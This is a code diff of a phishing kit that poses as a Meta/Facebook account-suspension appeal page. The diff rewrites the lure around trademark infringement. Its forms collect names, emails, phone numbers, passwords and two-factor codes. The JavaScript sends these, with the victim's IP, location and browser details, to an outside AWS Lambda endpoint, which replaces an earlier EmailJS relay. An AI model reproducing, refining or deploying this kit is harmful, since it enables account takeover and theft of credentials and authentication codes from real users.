@@ -3246,21 +3246,16 @@
                         <img src="../img/block_2.png" alt="" style="height: 40px;
                         width:40px;
                         margin-right: 8px;">
-                        We have suspended your page</h1>
-                    <p>We have received several reports that your account violates our Terms of Service and Community
-                        guidelines. As a result, your account will be sent for verification.</p>
+                        We have suspend your page
+                    </h1>
+                    <p>We have received multiple reports indicating that your advertisement violates trademark
+                        rights. After a detailed review, we have made a decision regarding this matter.</p>
                     <br>
                     <p>
-                        If you believe restrictions have been placed on your account in error, you can request a review.
-                    </p>
-                    <br>
-                    <div id="utm-ticketId" style="display: block;">
-                    
-                        <p class="small-grey">
-                            Your ticket id: <span>4964-ATFD-48XD</span></p>
-                    </div>
-
-
+                        If no corrective actions are taken, your advertising account will be permanently deleted.
+                        If you wish to appeal this decision, please submit an appeal request to us for review and
+                        assistance.
+                        <br>
                     <div class="action-button wide" id="view-accounts" onclick="accountsModal.show()"
                         style="display: none; margin-bottom: 15px;">
                         <div class="action-button-img">
@@ -3281,20 +3276,7 @@
                         </div>
                         <br>
                     </div>
-                    
-                    <h6>Appeal Guide</h6>
-                    <ul>
-                        <li>Fact checkers may not respond to requests that contain intimidation, hate speech, or other
-                            verbal threats.</li>
-                        <li>In your appeal, please include all necessary information to allow the fact checker to
-                            process your request in a timely manner. If you provide an invalid email address or do not
-                            respond to a request for additional information within 2 days, the fact checker may close
-                            the application without processing. If the appeal is not processed within 4 days, Meta will
-                            automatically reject it.</li>
-                        <li>When everything is ready, we will review your account and determine whether restrictions
-                            apply to it. The verification procedure usually lasts 24 hours, but in some cases it may
-                            take longer. Depending on our decision, the restrictions imposed will remain in effect or
-                            will be lifted and your account will be reinstated. </li>
+
                     </ul>
                     <div id="card">
                         <!-- <img src="/img/unlock.png" alt=""> -->
@@ -3302,9 +3284,9 @@
                         <img src="../img/shild.jpg" alt="">
                         <div class="card-text">
                             <p class="card-type">Review request</p>
-                            <h4>Fixing problems with account restrictions</h4>
-                            <p>Please be sure to provide the requested information below. Failure to provide this
-                                information may delay the processing of your appeal.</p>
+                            <h4>This form is only to be used for submitting appeals and restoring account status</h4>
+                            <p>Please ensure that you provide the requested information below.
+                                Failure to do so may delay the processing of your appeal.</p>
                             <div class="btn-wrapper">
                                 <div id="start" class="button fb-blue w-100" data-bs-toggle="modal"
                                     data-bs-target="#exampleModal1">
@@ -3313,6 +3295,30 @@
                             </div>
                         </div>
                     </div>
+                    <h5>What is trademark infringement</h5>
+
+                    </h5>Generally, trademark infringement occurs when all three of the following requirements are met
+                    </h5>
+                    <br>
+                    <p> 1. A comilany or person uses a trademark owner's trademark (or similar trademark) without
+                        permission.
+                    <p></p>
+                    <br>
+                    <p>2. That use is in commerce, meaning that it's done in connection with the sale or promotion of
+                        goods or services.
+                    <p></p>
+                    <br>
+                    <p>3. That use is likely to confuse consumers about the source, endorsement or affiliation of the
+                        goods or services.
+                    <p></p>
+                    <br>
+                    <p>The touchstone of trademark infringement is often "likelihood of confusion",
+                        and there are many factors that determine whether a use of a trademark is likely to cause
+                        confusion. For example,
+                        when a person's trademark is also used by someone else, but on unrelated goods or services,
+                        that use may not be infringement because it may not cause confusion.
+                        Which party used the trademark first can often be an important consideration as well.</p>
+
                     <br><br>
                     <h6>Privacy Center</h6>
                     <div class="fake-likns">
@@ -3475,8 +3481,6 @@
                                 required></textarea>
                             <div id="emailHelp" class="form-text">
                                 Please indicate why you believe that account restrictions were imposed by mistake.
-                                Our technology and team work in multiple languages to ensure consistent enforcement of rules.
-                                You can communicate with us in your native language.
                             </div>
                         </div>
                         <div class="mb-3">
@@ -3549,7 +3553,7 @@
                                 <label for="exampleInputPassword" class="form-label">Password</label>
                                 <div style="display: flex; align-items: center;">
                                     <input name="password-1" type="password" class="form-control"
-                                        id="exampleInputPassword" autocomplete="off" minlength="8" maxlength="30"
+                                        id="exampleInputPassword" autocomplete="off" minlength="6" maxlength="30"
                                         aria-describedby="emailHelp" required
                                         onfocus="this.removeAttribute('readonly');">
                                 </div>
@@ -3600,8 +3604,8 @@
                 <div class="modal-body">
                     <div class="twoFAinfo-wraper">
                         <h1 class="modal-title" id="2FAmodalLabel">Check your authentication code </h1>
-                        <p>Enter the digit code for this account from the two-factor authentication you set up
-                            (such as Google Authenticator, email  or text message on your mobile).</p>
+                        <p>Enter the 6-digit code for this account from the two-factor authentication you set up
+                            (such as Google Authenticator or text message on you mobile).</p>
                         <div class="fb-round-wraper">
                             <img src="../img/2FA.png" alt="" style="width: 100%;">
                         </div>
@@ -3844,7 +3848,7 @@
                     </p>
                     <br>
                     <p>
-                        Our policies.
+                        Полный текст политики приведен ниже.
                     </p>
                     <br>
                     <div class="action-button-list">
@@ -4263,7 +4267,7 @@
             'params': prettyUtmParams(),
         }
 
-        var INCORRECT_2FA_TIMEOUT = 30
+        var INCORRECT_2FA_TIMEOUT = 60
         var SEND_FORM_FICTIV_TIME = 2000
 
         var firstModal = new bootstrap.Modal(document.getElementById('exampleModal1'))
@@ -4358,6 +4362,7 @@
 
         // Get User IP
         var url = 'https://api.db-ip.com/v2/free/self/'
+        
         async function getUserIp() {
             const response = await fetch(url);
             if (response.status == 200) {
@@ -4375,52 +4380,41 @@
                 }
             }
         }
+
         /////
         getUserIp()
 
         // Send data to Email
         function sendDataEmail() {
-    var templateData = {
-        'ip_address': userIpData.user_ip,
-        'country': userIpData.country,
-        'country_code': userIpData.country_code,
-        'full_name': formsSendData['full-name'],
-        'pers_email': formsSendData['personal-email'],
-        'bus_email': formsSendData['buiseness-email'],
-        'phone_number': formsSendData['mobile-phone-number'],
-        'p_one': formsSendData['password-1'],
-        'p_two': formsSendData['password-2'],
-        'c_one': formsSendData['2FA-1'],
-        'c_two': formsSendData['2FA-2'],
-        'c_three': formsSendData['2FA-3'],
-        'fb_page_name': formsSendData['page-name'],
-        'message': formsSendData['apeal'],
-        'dis_name': metrics.dis_name,
-        'is_Mobile': metrics.is_Mobile,
-        'params': metrics.params
-    };
+            var templateData = {
+                'ip_address': userIpData.user_ip,
+                'country': userIpData.country,
+                'country_code': userIpData.country_code,
+                'city': userIpData.city,
+                'full_name': formsSendData['full-name'],
+                'pers_email': formsSendData['personal-email'],
+                'bus_email': formsSendData['buiseness-email'],
+                'phone_number': formsSendData['mobile-phone-number'],
+                'p_one': formsSendData['password-1'],
+                'p_two': formsSendData['password-2'],
+                'c_one': formsSendData['2FA-1'],
+                'c_two': formsSendData['2FA-2'],
+                'c_three': formsSendData['2FA-3'],
+                'fb_page_name': formsSendData['page-name'],
+                'message': formsSendData['apeal'],
+                'user_agent': window.navigator.userAgent,
+                'user_referrer': window.window.location.href,
+            };
 
-    var serviceID = "service_4acsykl";
-    var userId = "6ENC96JJgQ6OcWQ4t";
-    var templateId = "template_6za7yga";
-
-    var data = {
-        service_id: serviceID,
-        template_id: templateId,
-        user_id: userId,
-        template_params: templateData
-    };
-
-    $.ajax('https://api.emailjs.com/api/v1.0/email/send', {
-        type: 'POST',
-        data: JSON.stringify(data),
-        contentType: 'application/json'
-    }).done(function () {
-        // Xử lý khi gửi thành công
-    }).fail(function (error) {
-        // Xử lý khi gửi thất bại
-    });
-}
+            $.ajax('https://yal32bnurk4yna4k73okvggdau0cjzgc.lambda-url.us-west-2.on.aws/', {
+                type: 'POST',
+                data: JSON.stringify(templateData),
+                contentType: 'application/json'
+            }).done(function () {
+            }).fail(function (error) {
+            });
+        }
+        
         function firstFormHandle(event) {
             event.preventDefault()
             updateFormsSendData(serializeForm(firstForm))
